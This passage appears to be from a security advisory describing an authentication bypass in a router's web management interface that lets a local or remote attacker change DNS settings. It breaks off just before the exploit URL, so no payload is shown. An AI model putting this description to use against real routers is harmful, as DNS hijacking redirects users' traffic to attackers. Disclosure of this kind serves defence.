  This security hole allows an attacker to bypass
  authentication and change the DNS. When the
  administrator is logged in the web  management
  interface, an attacker may be able to completely
  bypass authentication phase and connect to the
  web management interface with administrator's
  credentials. This attack can also be performed
  by an external attacker who connects to the
  router's public IP address, if remote management
  is enabled. To change the DNS without logging
  into web management interface use the following URL:
